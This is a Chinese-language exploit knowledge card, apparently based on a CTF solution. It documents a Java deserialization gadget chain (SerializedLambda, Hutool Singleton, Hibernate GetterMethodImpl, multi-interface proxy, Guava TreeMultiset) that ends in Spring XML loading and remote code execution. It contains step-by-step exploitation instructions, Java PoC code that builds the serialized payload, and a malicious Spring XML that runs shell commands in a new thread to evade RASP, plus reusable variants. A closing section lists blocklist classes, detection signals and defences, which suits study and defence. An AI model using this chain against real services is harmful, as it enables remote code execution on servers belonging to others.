---
id: web-java-deser-serializedlambda-multiinterface-proxy-gadget
title: SerializedLambda 构造可序列化匿名类 + 多接口代理方法优先级：Hutool Singleton 到 Spring XML 加载
type: scenario
domain: web
path: web/java/deserialization
technique: serializedlambda-multiinterface-proxy-gadget
tags:
- java
- deserialization
- serializedlambda
- dynamic-proxy
- hutool
- hibernate
- guava
- spring-xml
- gadget-chain
- rce
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V116
  verified_at: '2026-11-06T01:46:55+08:00'
  notes: 已对照原文与 23-34 图核对：Singleton.get 的 Func0 lambda、SerializedLambda 构造器 10 参数与 REF_invokeStatic、GetterMethodImpl.get->Func0.call、[Getter,Map] 代理方法优先级、Functions.compose/forMap/constant、FuncComparator/TreeMultiset.readObject 堆栈、FileSystemXmlApplicationContext 加载 XML 均一致；图为原解题代码与调试栈。未验证点：PoC 未在本机复跑；lambda 方法与库版本相关；frontmatter 无 sources/source_url。
url: /docs/web/java/deserialization/web-java-deser-serializedlambda-multiinterface-proxy-gadget/
draft: false
kb_aliases:
- SerializedLambda gadget
- 可序列化匿名类
- 多接口动态代理方法优先级
- Hutool Singleton 匿名类
- GetterMethodImpl get
- TreeMultiset FuncComparator
- Spring XML 加载
---

## 一句话结论

`java.lang.invoke.SerializedLambda` 可被反射构造成任意“可序列化匿名类”，把 Hutool `Singleton.get()` 内部的 `Func0` 匿名函数实体化为攻击者可控对象；再借 Hibernate `GetterMethodImpl.get(owner)` 对 owner 调用任意 public 方法，并用“动态代理同时实现 Getter 与 Map 时优先调用第一个接口方法”的特性，把 Guava `TreeMultiset` 的 `FuncComparator` 调用接到 `Func0.call()`，最终执行 `Singleton` 匿名类里的 `ReflectUtil.newInstance(FileSystemXmlApplicationContext, evil.xml)` 加载恶意 Spring XML 实现 RCE。

## 原理

- **SerializedLambda 是 lambda 的可序列化描述**：它保存 capturingClass、functionalInterfaceClass、implMethodName、instantiatedMethodType、capturedArgs 等字段；反序列化时会通过 `$deserializeLambda$` 还原 lambda。攻击者可用反射构造一个 `SerializedLambda`，指向目标类中已有的、可执行危险逻辑的私有静态 lambda 方法（示例 `Singleton.lambda$get$...`）。
- **Hutool Singleton 的匿名类可调用任意 public 构造方法**：`Singleton.get(Class<T> clazz, Object... params)` 内部是 `Func0` lambda，调用 `ReflectUtil.newInstance(clazz, params)`；把 `clazz` 设为 `FileSystemXmlApplicationContext`、params 设为恶意 XML URL，lambda 执行即加载 XML。
- **Hibernate GetterMethodImpl 是“任意 public 方法调用器”**：`get(Object owner)` 执行 `getterMethod.invoke(owner)`；getterMethod 可以是 `Func0.call`，owner 就是构造好的 SerializedLambda 实例，于是 `call()` 触发 lambda 体。
- **多接口动态代理的方法选择优先级**：`Proxy.newProxyInstance` 代理 `[Getter, Map]` 两个接口，二者都有 `get` 方法；JDK 动态代理对同签名方法优先调用**第一个接口**的方法，即 `Getter.get` 而不是 `Map.get`。因此 Guava `Functions.forMap(proxyMap)` 的 `map.get(key)` 实际进入 `Getter.get` → `GetterMethodImpl.get` → `Func0.call`。
- **Guava TreeMultiset 触发 compare**：`TreeMultiset.readObject` 反序列化时逐个 `add` 元素，调用 `FuncComparator.doCompare` → `Functions.compose(...).apply` → `forMap(proxyMap).apply(constant(forgedFunc0))` → `proxyMap.get(forgedFunc0)` → 上述链。
- **为什么最终危害成立**：整条链只用黑名单外的 JDK/Hutool/Hibernate/Guava 类，最终到达 Spring `FileSystemXmlApplicationContext` 加载远程 XML；XML 中用 `MethodInvokingRunnable` + `Thread.start` 执行命令，并可借新线程绕过 RASP 的 HTTP 上下文检测。

## 触发条件

- 存在原生反序列化入口，过滤器未拦 `SerializedLambda`、动态代理、Guava `TreeMultiset`、Hibernate `GetterMethodImpl`、Hutool `Singleton`。
- classpath 含 Hutool（Singleton/Func0/JdkInterceptor）、Hibernate（GetterMethodImpl）、Guava（TreeMultiset/Functions）、Spring（FileSystemXmlApplicationContext）及 XML 解析依赖。
- 目标可访问攻击者 XML（HTTP/文件路径），或 XML 随 payload 一起投递。
- JDK 与库版本匹配（示例 JDK8；`SerializedLambda` 字段与方法名随版本变化，需本地探测）。

## 利用步骤

1. **定位可用的匿名 lambda**：在 Hutool `Singleton.get` 中找到 `lambda$get$...` 匿名类，其行为是 `ReflectUtil.newInstance(clazz, params)`；记录捕获类、方法名、方法签名。
2. **构造 SerializedLambda**：反射调用 `SerializedLambda` 构造器，capturingClass=Singleton，functionalInterface=Func0，implMethodName=该 lambda 名，instantiatedMethodType=`(Ljava/lang/Class;[Ljava/lang/Object;)Ljava/lang/Object;`，capturedArgs={恶意 Class, 参数数组}。
3. **构造任意方法调用器**：`GetterMethodImpl(Func0.class, "call", Func0.class.getDeclaredMethod("call"))`；owner 设为上一步的 SerializedLambda。
4. **构造多接口代理**：`Proxy.newProxyInstance(loader, new Class[]{Getter.class, Map.class}, new JdkInterceptor(getter, new SimpleAspect()))`；保证 Getter 在 Map 前面。
5. **构造比较器**：`Functions.compose(Functions.forMap(proxyMap), Functions.constant(forgedFunc0))`，包进 `FuncComparator`。
6. **构造 TreeMultiset**：先自然序 add 元素，再反射替换 comparator，序列化。
7. **发送 payload**；反序列化时 `TreeMultiset.readObject → add → compare → apply → proxy.get → Getter.get → GetterMethodImpl.get → Func0.call → Singleton lambda → newInstance(FileSystemXmlApplicationContext, evil.xml)`。
8. **恶意 XML**：`MethodInvokingRunnable` 调 `RuntimeUtil.execForStr`，外层 `Thread` bean `init-method="start"` 在新线程执行命令，读取 flag。

## PoC

```java
// 1) 伪造 SerializedLambda，指向 Singleton 的匿名 lambda
Constructor<SerializedLambda> ctor = SerializedLambda.class.getDeclaredConstructor(
    Class.class, String.class, String.class, String.class, int.class,
    String.class, String.class, String.class, String.class, Object[].class);
ctor.setAccessible(true);
SerializedLambda forged = ctor.newInstance(
    Singleton.class,
    "cn/hutool/core/lang/func/Func0",
    "call",
    "()Ljava/lang/Object;",
    MethodHandleInfo.REF_invokeStatic,
    "cn/hutool/core/lang/Singleton",
    lambdaName,                                   // 反射探测 lambda$get$...
    "(Ljava/lang/Class;[Ljava/lang/Object;)Ljava/lang/Object;",
    "()Ljava/lang/Object;",
    new Object[]{FileSystemXmlApplicationContext.class, new Object[]{evilXmlUrl}});

// 2) GetterMethodImpl 绑定 Func0.call，owner = forged lambda
Method call = Func0.class.getDeclaredMethod("call");
GetterMethodImpl getter = new GetterMethodImpl(Func0.class, "call", call);

// 3) 多接口代理：[Getter, Map]，get 优先走 Getter
Object proxyMap = Proxy.newProxyInstance(loader,
    new Class[]{Getter.class, Map.class},
    new JdkInterceptor(getter, new SimpleAspect()));

// 4) Guava compose -> FuncComparator -> TreeMultiset
Function compose = Functions.compose(
    Functions.forMap((Map) proxyMap),
    Functions.constant(forged));
FuncComparator comparator = new FuncComparator(false, false, compose);
TreeMultiset multiset = TreeMultiset.create();
multiset.add(1); multiset.add(2);
setComparator(multiset, comparator);   // 反射替换
byte[] payload = serialize(multiset);
```

```xml
<!-- evil.xml：新线程执行命令，顺带绕过 RASP 的 HTTP 线程检测 -->
<bean id="runner" class="org.springframework.scheduling.support.MethodInvokingRunnable">
  <property name="staticMethod" value="cn.hutool.core.util.RuntimeUtil.execForStr"/>
  <property name="arguments">
    <list><array value-type="java.lang.String">
      <value>/bin/sh</value><value>-c</value>
      <value>/getflag > /tmp/javamix_flag 2>&1</value>
    </array></list>
  </property>
</bean>
<bean id="worker" class="java.lang.Thread" init-method="start">
  <constructor-arg ref="runner"/>
</bean>
```

原文实测：堆栈为 `TreeMultiset.readObject → add → FuncComparator.doCompare → Functions$FunctionComposition.apply → FunctionForMapNoDefault.apply → $Proxy0.get → JdkInterceptor.invoke → GetterMethodImpl.get → Singleton$$Lambda.call → ReflectUtil.newInstance → FileSystemXmlApplicationContext.<init>`，最终读取 flag；至少两位选手用该非预期解。

## 变体与关联

- **lambda 载体变体**：Hutool `Singleton`、其他库内含危险逻辑的私有 lambda、`Func0/Func1` 等函数接口。
- **方法调用器变体**：Hibernate `GetterMethodImpl`、Spring `MethodInvokingFactoryBean`、任何对 owner 反射调用 public method 的类。
- **代理优先级变体**：`[Getter, Map]`、`[A, B]` 同签名方法取第一个接口；可用来把 `Map.get`/`Comparator.compare` 等调用重定向到任意接口方法。
- **触发变体**：Guava `TreeMultiset`、`ImmutableSetMultimap`、其他反序列化时逐个 add/compare 的集合。
- **关联卡片**：[[web-java-deser-resolveproxyclass-blacklist-hutool-mapproxy]]（同题 Hutool 二次反序列化）、[[web-java-deserialization-interface-proxy-templatesimpl-blacklist-bypass]]（动态代理绕过黑名单）、[[web-java-rce-rasp-http-thread-context-new-thread-bypass]]（XML 新线程绕过 RASP）。
- **边界**：`SerializedLambda` 构造器/字段随 JDK 版本变化；lambda 方法名依赖 Hutool 版本（示例 5.8.22 附近）；需要 Hibernate/Guava/Spring 依赖与可访问 XML；过滤器若拦 `SerializedLambda`/代理/`TreeMultiset` 则失效。

## 检测与防御

- **反序列化过滤**：把 `java.lang.invoke.SerializedLambda`、`java.lang.reflect.Proxy`/`com.sun.proxy`、`TreeMultiset`、`GetterMethodImpl`、`Singleton` 纳入黑名单；用 JEP 290 全图白名单，禁止未知 lambda/代理。
- **依赖治理**：移除不必要的 Hutool/Hibernate/Guava/Spring XML 组合；禁止 `FileSystemXmlApplicationContext`/`ClassPathXmlApplicationContext` 从外部 URL 加载 XML；限制 `ReflectUtil.newInstance` 可达。
- **检测信号**：反序列化流中出现 `SerializedLambda`、`$Proxy`、`TreeMultiset`、`FuncComparator`、`GetterMethodImpl`；请求后出现 Spring XML 解析与 `Thread.start`；临时目录出现命令输出文件。
- **响应**：隔离 payload、提取 XML 与命令、排查内存马/反序列化入口，升级过滤器规则并轮换凭据。
